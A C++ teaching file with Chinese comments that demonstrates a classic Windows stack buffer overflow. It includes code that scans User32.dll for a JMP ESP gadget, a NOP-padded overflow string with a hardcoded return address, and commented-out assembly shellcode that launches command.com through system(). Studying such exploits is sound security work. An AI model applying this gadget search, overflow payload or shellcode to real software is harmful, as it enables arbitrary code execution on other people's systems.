
/***************************************************************************************
缓冲区溢出漏洞(Buffer Overflow Bug):
源自于某些函数(如strcat, strcpy等)不对缓冲区的边界进行检查，如果传递超过指定长度的参数则
导致某些重要的寄存器地址被覆盖，轻则导致程序运行失败或系统崩溃，重则可使机器运行攻击者指
定的代码。

栈中的存储情况   ESP|...Local Buffer...|EBP|EIP

恶意字符串结构       ...NOP...NOP...NOP.....AAA...ShellCode...

如果攻击者构造特定的字符串依次覆盖Buffer至EIP，而EIP的值又是被事先设置的某个地址则程序的
执行流程将跳至攻击者指定的地址AAA，如果此时EIP指向攻击者所写的ShellCode代码，则机器将开
始执行攻击指令。
***************************************************************************************/

#include <iostream.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>


void main()
{
	/*
	system("command.com");
	LoadLibrary("msvcrt.dll");
	__asm
	{
		mov esp,ebp                  ;把ebp的内容赋值给esp
		push ebp                     ;保存ebp
		mov ebp,esp                  ;给ebp赋新值，将作为局部变量的基指针
		xor edi,edi                  ;edi清零
		push edi                     ;往栈中压入0，同时esp-4，作用是构造字符串的结尾\0字符
		sub esp,08h                  ;加上上面，一共有12个字节，用来放"command.com"
		mov byte ptr [ebp-02h],6dh   ;'m'
		mov byte ptr [ebp-03h],6fh   ;'o'
		mov byte ptr [ebp-04h],63h   ;'c'
		mov byte ptr [ebp-05h],2Eh   ;'.'
		mov byte ptr [ebp-06h],64h   ;'d'
		mov byte ptr [ebp-07h],6eh   ;'n'
		mov byte ptr [ebp-08h],61h   ;'a'
		mov byte ptr [ebp-09h],6dh   ;'m'
		mov byte ptr [ebp-0ah],6dh   ;'m'
		mov byte ptr [ebp-0bh],6fh   ;'o'
		mov byte ptr [ebp-0ch],63h   ;'c'
		lea eax,[ebp-0ch]            ;取得串的首地址
		push eax                     ;串地址作为参数入栈
		mov eax, 0x0040102d          ;将system函数的地址赋给eax
		call eax                     ;调用system
	}
	*/
	
/***************************************************************************************
NT系统为每个进程分配了4GB的虚拟内存空间(0x00000000 ~ 0xffffffff)，EXE可执行文件每次运行
时都被加载到固定的地址空间(起始地址0x00401000)处，DLL动态链接库文件的映像每次也被加载到
固定的地址空间，但在不同的OS其地址空间可能不同。
***************************************************************************************/
	
	//在User32.dll的加载空间中查找指定的指令的地址。
	bool loaded = false; 
	HINSTANCE h; 
	TCHAR dllname[] = "User32.dll"; 
	h = ::GetModuleHandle(dllname);   //若已加载User32.dll则取得其句柄
	if(h == NULL)   //若没有则加载User32.dll
	{ 
		h = ::LoadLibrary(dllname); 
		if(h == NULL) 
		{ 
			cout<<"ERROR LOADING DLL: "<<dllname<<endl; 
		} 
		loaded = true; 
	}
	BYTE* ptr = (BYTE*)h; 
	bool done = false; 
	for(int y=0; !done; y++)   //在User32.dll的内存映像中搜索指定的指令
	{ 
		try 
		{
			if(ptr[y] == 0xFF && ptr[y+1] == 0xE4)   //FF E4 == JMP ESP
			{ 
				int pos = (int)ptr + y; 
				cout<<"OPCODE [FF E4] found - 0x"<<hex<<pos<<endl; 
			} 
		} 
		catch(...) 
		{ 
			cout<<"END OF "<<dllname<<" MEMORY REACHED"<<endl; 
			done = true; 
		} 
	} 
	//if(loaded) 
	//{
	//FreeLibrary(h); 
	//}
	
#define MAX_SIZE 8
	char buf[MAX_SIZE];
	
/***************************************************************************************
由于程序堆栈溢出时ESP指向ShellCode，那么EIP可以不直接指向ShellCode，而是指向指令JMP ESP
(机器码FF E4)，所以此处EIP是从User32.dll中找到的0x77d99323，内容为FF E4
***************************************************************************************/
	
	char input[MAX_SIZE+4+4+1] = {'\x90','\x90','\x90','\x90','\x90','\x90','\x90',
		'\x90','\x90','\x90','\x90','\x90','\x23','\x93','\xd9','\x77','\x00'};
	strcpy(buf, input);
	//::MessageBox(NULL, "Overflow Succeed", "Message", MB_OK);
	char szCaption[] = "Message";
	char szText[] = "Overflow Succeed";
	__asm
	{
		push MB_OK
		lea eax, szCaption
		push eax
		lea eax, szText
		push eax
		push NULL
		call dword ptr [MessageBox]
	}

//此测试代码没有写入ShellCode，而是在缓冲区溢出后让EIP指向下一条指令，程序仍然可以正常运行
}